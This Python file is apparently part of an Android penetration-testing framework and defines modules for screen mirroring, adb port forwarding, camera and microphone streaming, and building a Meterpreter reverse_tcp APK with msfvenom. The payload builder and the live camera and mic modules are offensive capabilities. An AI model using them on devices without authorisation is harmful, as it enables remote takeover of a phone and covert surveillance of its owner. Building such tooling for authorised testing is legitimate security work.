"""External-tool actions: scrcpy mirror/camera/mic, msfvenom payloads."""

from __future__ import annotations

import os

from omni.android import extras
from omni.core import config
from omni.core.module import Option
from omni.android.modules._base import AndroidModule


class Mirror(AndroidModule):
    NAME = "android.mirror"
    DESCRIPTION = "Mirror the screen with scrcpy (Ctrl-C to stop)"
    NEEDS = ("adb", "scrcpy")
    OPTIONS = (Option("RECORD", "also write an mp4 here (blank = none)", ""),
               Option("NO_CONTROL", "view only", "false",
                      choices=("true", "false")),
               Option("MAX_SIZE", "cap the video width in px (0 = native)", "0"))

    def execute(self) -> int:
        client = self.adb()
        record = self.get("RECORD")
        if record:
            record = os.path.expanduser(record)
        cap = self.get_int("MAX_SIZE")
        return extras.mirror(client.serial, record=record or None,
                             no_control=self.get_bool("NO_CONTROL"),
                             max_size=cap or None)


class Camera(AndroidModule):
    NAME = "android.camera"
    DESCRIPTION = "Stream the camera through scrcpy"
    NEEDS = ("adb", "scrcpy")
    OPTIONS = (Option("FACE", "back|front|external", "back",
                      choices=("back", "front", "external")),)

    def execute(self) -> int:
        return extras.camera_stream(self.adb().serial, self.get("FACE"))


class Mic(AndroidModule):
    NAME = "android.mic"
    DESCRIPTION = "Listen to the microphone (or record it)"
    NEEDS = ("adb", "scrcpy")
    OPTIONS = (Option("RECORD", "write audio here (blank = just listen)", ""),)

    def execute(self) -> int:
        client, path = self.adb(), self.get("RECORD")
        if path:
            return extras.record_mic(os.path.expanduser(path), client.serial)
        return extras.mic_stream(client.serial)


class Payload(AndroidModule):
    NAME = "android.payload"
    DESCRIPTION = "Build a Meterpreter APK with msfvenom"
    NEEDS = ("adb", "msfvenom")
    OPTIONS = (Option("LHOST", "listener host (defaults to config)", ""),
               Option("LPORT", "listener port", "4444"),
               Option("PAYLOAD", "msfvenom payload",
                      "android/meterpreter/reverse_tcp"))

    def execute(self) -> str:
        if self.get("LHOST"):
            config.set_value("pentest.lhost", self.get("LHOST"))
        return extras.metasploit(self.get("PAYLOAD"),
                                 self.get("LHOST") or None,
                                 self.get_int("LPORT", 4444))


class Forward(AndroidModule):
    NAME = "android.forward"
    DESCRIPTION = "List / add / remove adb port forwards"
    OPTIONS = (Option("ACTION", "list|add|remove|clear", "list",
                      choices=("list", "add", "remove", "clear")),
               Option("LOCAL", "local spec, e.g. tcp:8080", ""),
               Option("REMOTE", "remote spec, e.g. tcp:8080", ""))

    def execute(self) -> list[str]:
        from omni.core import console
        client, action = self.adb(), self.get("ACTION")
        if action == "add":
            extras.port_forward(self.get("LOCAL"), self.get("REMOTE"), client.serial)
        elif action == "remove":
            extras.remove_forward(self.get("LOCAL") or None, client.serial)
        elif action == "clear":
            extras.remove_forward(None, client.serial)
        rows = extras.list_forwards(client.serial)
        for row in rows:
            console.info(row)
        return rows
